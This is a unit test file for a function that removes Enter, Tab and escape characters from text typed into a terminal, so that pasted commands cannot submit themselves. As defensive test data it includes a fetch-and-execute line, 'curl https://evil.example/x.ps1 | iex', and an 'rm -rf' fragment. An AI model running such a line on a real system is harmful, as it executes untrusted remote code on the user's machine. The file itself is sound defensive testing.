import fs from 'node:fs'
import { describe, expect, it } from 'vitest'
import { typeable } from '../src/core/typed-text.js'

// The invariant these protect is stated three times in the source — beside
// `pasteIntoTerminal`, beside `insert`, and in `effects.js` — and it is the one
// with teeth: Claude Code has tools that delete files, so nothing Jarvis types
// may submit itself. A carriage return written to a pseudo-terminal is Enter.

describe('what may be typed without pressing anything', () => {
  it('leaves ordinary text exactly as it is', () => {
    expect(typeable('npm run assemble')).toBe('npm run assemble')
    expect(typeable('git commit -m "the panel takes a side"')).toBe(
      'git commit -m "the panel takes a side"',
    )
  })

  it('takes the Enter out of a pasted command', () => {
    // The clipboard holds whatever the last page the user read put there, and a
    // page can put something else there as they copy. Without this, one click
    // on Paste ran the second line.
    expect(typeable('Get-ChildItem\rcurl https://evil.example/x.ps1 | iex\r')).toBe(
      'Get-ChildItem curl https://evil.example/x.ps1 | iex ',
    )
  })

  it('treats a Windows line ending as one break, not two', () => {
    // Every multi-line copy on Windows is CRLF-separated, so this is the common
    // case rather than the attack: it must read as one space.
    expect(typeable('first\r\nsecond')).toBe('first second')
    expect(typeable('first\nsecond')).toBe('first second')
  })

  it('drops the control characters that are keys rather than letters', () => {
    // Tab at a prompt is completion and escape begins a sequence the shell acts
    // on. Neither is something a person meant to type.
    expect(typeable('rm\t-rf')).toBe('rm-rf')
    expect(typeable('ls\u001b[Aecho')).toBe('ls[Aecho')
    expect(typeable('a\u0000b\u0007c')).toBe('abc')
  })

  it('answers with an empty string for nothing at all', () => {
    expect(typeable('')).toBe('')
    expect(typeable(null)).toBe('')
    expect(typeable(undefined)).toBe('')
  })
})

describe('the terminal channel', () => {
  // Read rather than run: `main/terminal.js` reaches for node-pty at import, and
  // a real shell is not something a unit test should need. What is checked is
  // the one line the invariant rests on.
  const source = fs.readFileSync(new URL('../src/main/terminal.js', import.meta.url), 'utf8')
  const between = (from, to) => source.slice(source.indexOf(from), source.indexOf(to))

  it('makes typed text typeable before it reaches the shell', () => {
    expect(between('function insert', 'function run')).toContain(
      'shellProcess.write(typeable(text))',
    )
  })

  it('keeps the one path that presses Enter, and keeps it to itself', () => {
    // `run` is a Command shortcut the user pressed, and it is the only writer
    // allowed to append a return.
    expect(between('function run', 'function typeFromUser')).toContain('`${command}\\r`')
    expect(between('function insert', 'function run')).not.toContain('\\r')
  })
})
